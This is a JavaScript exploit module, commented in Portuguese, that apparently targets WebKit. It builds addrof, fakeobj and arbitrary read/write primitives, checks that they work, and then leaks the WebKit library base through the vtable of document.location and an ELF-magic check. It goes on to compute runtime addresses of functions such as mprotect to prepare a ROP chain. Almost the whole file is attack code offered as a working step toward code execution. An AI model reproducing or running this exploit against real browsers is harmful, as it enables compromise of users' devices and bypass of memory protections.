// js/script3/testArrayBufferVictimCrash.mjs (v112 - ROP Prep Final)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Corrigido o TypeError de 'vtable_ptr.and'.
// Adicionada a etapa de preparação de ROP, que usa a base do WebKit vazada para
// calcular os endereços em tempo de execução de funções e gadgets essenciais.
// =======================================================================================

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importa os offsets

export const FNAME_MODULE_FINAL = "Uncaged_Final_v112_ROP_Ready";

// --- Funções de Conversão (Inalteradas) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf);
    u32[0] = int64.low(); u32[1] = int64.high(); return f64[0];
}
function doubleToInt64(double) {
    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// NOVA FUNÇÃO: PREPARAÇÃO DA CADEIA ROP
// =======================================================================================
async function runROPChainPreparation(webkit_base, arb_read) {
    const FNAME_ROP_TEST = "ROP_Prep_Test";
    logS3(`--- Iniciando Preparação da Cadeia ROP ---`, "subtest", FNAME_ROP_TEST);
    try {
        const webkitBaseAddr = new AdvancedInt64(webkit_base);
        logS3(`Usando a base do WebKit vazada: ${webkitBaseAddr.toString(true)}`, "info", FNAME_ROP_TEST);

        const real_addresses = {};
        for (const funcName in WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS) {
            const offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[funcName]);
            real_addresses[funcName] = webkitBaseAddr.add(offset);
        }
        
        logS3("Endereços de funções importantes calculados:", "good", FNAME_ROP_TEST);
        logS3(`  mprotect_plt_stub: ${real_addresses["mprotect_plt_stub"].toString(true)}`, "leak", FNAME_ROP_TEST);
        
        const mprotect_code_signature = arb_read(real_addresses["mprotect_plt_stub"]);
        logS3(`Assinatura de código lida de mprotect: ${mprotect_code_signature.toString(true)}`, "leak", FNAME_ROP_TEST);
        if (mprotect_code_signature.low() === 0) throw new Error("A assinatura de código de mprotect parece nula.");
        
        logS3("SUCESSO ROP PREP! Endereços parecem válidos e a cadeia está pronta para ser construída.", "vuln", FNAME_ROP_TEST);
        return { success: true, ROP_MAP: real_addresses };

    } catch (e) {
        logS3(`Falha na preparação da ROP: ${e.message}`, "critical", FNAME_ROP_TEST);
        return { success: false, ROP_MAP: null };
    }
}

// =======================================================================================
// FUNÇÃO DE TESTE DE VAZAMENTO (CORRIGIDA)
// =======================================================================================
async function runWebKitBaseLeakTest(addrof, arb_read) {
    const FNAME_LEAK_TEST = "WebKitBaseLeakTest";
    logS3(`--- Iniciando Teste de Vazamento da Base do WebKit ---`, "subtest", FNAME_LEAK_TEST);
    try {
        const location_obj = document.location;
        const location_addr = addrof(location_obj);
        const vtable_ptr = arb_read(location_addr);
        if (vtable_ptr.low() === 0 && vtable_ptr.high() === 0) throw new Error("Ponteiro da vtable vazado é nulo.");
        logS3(`Ponteiro da Vtable vazado: ${vtable_ptr.toString(true)}`, "leak", FNAME_LEAK_TEST);

        // CORREÇÃO: Realiza o AND bitwise manualmente nas partes low e high.
        const MASK_LOW = 0xFFFFC000;
        const MASK_HIGH = 0xFFFFFFFF;
        const base_low = vtable_ptr.low() & MASK_LOW;
        const base_high = vtable_ptr.high() & MASK_HIGH;
        const webkit_base_candidate = new AdvancedInt64(base_low, base_high);
        logS3(`Candidato a endereço base do WebKit (alinhado): ${webkit_base_candidate.toString(true)}`, "leak", FNAME_LEAK_TEST);

        const elf_magic_full = arb_read(webkit_base_candidate);
        if (elf_magic_full.low() === 0x464C457F) { // Check for "\x7fELF"
            logS3(`SUCESSO DE VAZAMENTO! Assinatura ELF encontrada.`, "vuln", FNAME_LEAK_TEST);
            return { success: true, webkit_base: webkit_base_candidate.toString(true) };
        } else {
            throw new Error(`Assinatura ELF não encontrada. Lido: 0x${elf_magic_full.low().toString(16)}`);
        }
    } catch(e) {
        logS3(`Falha no teste de vazamento do WebKit: ${e.message}`, "critical", FNAME_LEAK_TEST);
        return { success: false, webkit_base: null };
    }
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runFinalUnifiedTest() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste com Primitivas Unificadas ---`, "test");
    let final_result;
    try {
        logS3("--- FASE 1-3: Configurando e construindo primitivas... ---", "subtest");
        const vulnerable_slot = [13.37]; 
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);
        const addrof = (obj) => { vulnerable_slot[0] = obj; return doubleToInt64(vulnerable_slot[0]).sub(NAN_BOXING_OFFSET); };
        const fakeobj = (addr) => { vulnerable_slot[0] = int64ToDouble(new AdvancedInt64(addr).add(NAN_BOXING_OFFSET)); return vulnerable_slot[0]; };
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => { leaker.obj_prop = fakeobj(addr); return doubleToInt64(leaker.val_prop); };
        const arb_write_final = (addr, value) => { leaker.obj_prop = fakeobj(addr); leaker.val_prop = int64ToDouble(value); };
        logS3("Primitivas de L/E e Addrof estão operacionais.", "good");

        logS3("--- FASE 4: Verificando L/E... ---", "subtest");
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        arb_write_final(addrof({ a: 1.1 }).add(0x10), value_to_write);
        if (!arb_read_final(addrof({ a: 1.1 }).add(0x10)).equals(value_to_write)) throw new Error("A verificação de L/E falhou.");
        logS3("++++++++++++ SUCESSO L/E! As primitivas são 100% funcionais. ++++++++++++", "vuln");

        const leak_result = await runWebKitBaseLeakTest(addrof, arb_read_final);
        if (!leak_result.success) throw new Error("Não foi possível vazar a base do WebKit.");
        
        const rop_result = await runROPChainPreparation(leak_result.webkit_base, arb_read_final);
        if (!rop_result.success) throw new Error("Falha ao preparar a cadeia ROP.");

        final_result = { success: true, message: `SUCESSO COMPLETO. WebKit Base: ${leak_result.webkit_base}. ROP Pronto.` };
    } catch (e) {
        final_result = { success: false, message: `ERRO CRÍTICO NO TESTE: ${e.message}` };
        logS3(final_result.message, "critical");
    }
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return final_result;
}
